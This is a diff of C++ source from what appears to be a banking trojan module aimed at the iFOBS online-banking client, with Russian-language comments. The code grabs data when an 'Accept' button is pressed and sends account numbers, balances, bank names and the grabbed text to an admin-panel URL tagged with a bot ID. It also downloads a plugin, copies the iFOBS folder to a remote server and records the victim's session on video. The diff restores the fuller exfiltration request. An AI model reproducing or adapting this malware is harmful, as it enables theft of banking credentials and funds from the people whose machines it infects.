@@ -55,8 +55,6 @@ char resultGrab[128]; //результат грабера для отсылки в админку и видео сервер
 //хеши кнопки Принять на разных языках, при нажатии такой кнопки грабятся данные 
 DWORD btAccept[] = { 0x8DBF3905 /* Принять */, 0x62203A2E /* Прийняти */, 0x3C797A7A /* Accept */, 0 };
 
-VideoSendLog* vsl = 0;
-
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
 	ForFindControl* ffc = (ForFindControl*)lParam;
@@ -228,7 +226,7 @@ static DWORD WINAPI SendBalans( LPVOID p )
 {
 	char urlAdmin[128];
 	AccBalans* ab = (AccBalans*)p;
-	VideoSendLogName log( *vsl, "ifobs" );
+	VideoLog log( "ifobs" );
 	log.Send( 10, "Счет: '%s', баланс: '%s', банк: '%s'", ab->acc, ab->balans, ab->nameBank );
 	if( GetAdminUrl(urlAdmin) )
 	{
@@ -237,8 +235,8 @@ static DWORD WINAPI SendBalans( LPVOID p )
 		string azUser = GetAzUser();
 		char* urlBank = URLEncode(ab->nameBank);
 		char* urlGrab = URLEncode(resultGrab);
-//		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc, urlBank, urlGrab );
-		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=1", urlAdmin, BOT_UID, azUser.t_str(), ab->balans );
+		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=%s&text=bank|%s,text|%s", urlAdmin, BOT_UID, azUser.t_str(), ab->balans, ab->acc, urlBank, urlGrab );
+//		pwsprintfA( request.AsStr(), "http://%s/raf/?uid=%s&sys=ifobs&cid=%s&mode=balance&sum=%s&acc=1", urlAdmin, BOT_UID, azUser.t_str(), ab->balans );
 		STR::Free(urlBank);
 		STR::Free(urlGrab);
 //		THTTP H;
@@ -265,8 +263,7 @@ void WINAPI PutBalans( const char* acc, const char* balans, const char* nameBank
 
 DWORD WINAPI PluginIFobs(LPVOID)
 {
-	vsl = new VideoSendLog();
-	VideoSendLogName log( *vsl, "ifobs" );
+	VideoLog log( "ifobs" );
 	log.Send2( 0, "Загрузка плагина ifobs.plug" );
 	TPlugin ifobsPlug("ifobs.plug");
 	if( ifobsPlug.Download(true) )
@@ -330,7 +327,7 @@ DWORD WINAPI SendIFobs(LPVOID)
 	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
 	{
 		DBG( "IFobs", "Копирование на сервер" );
-		VideoRecorder::SendFiles(tempFolder);
+		VideoProcess::SendFiles( 0, 0, tempFolder );
 		DeleteFolders(tempFolder);
 		DBG( "IFobs", "Копирование на сервер окончено" );
 	}
@@ -346,7 +343,8 @@ void Activeted(LPVOID Sender)
 	RunThread( PluginIFobs, 0 );
 	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
 		MegaJump(SendIFobs);
-	VideoRecorderSrv::StartInfiniteRecording("IFobs");
+	VideoProcess::RecordPID( 0, "IFobs" );
+	VideoProcess::SendLog( 0, "test", 0, "go!");
 }
 
 bool Init( const char* appName )
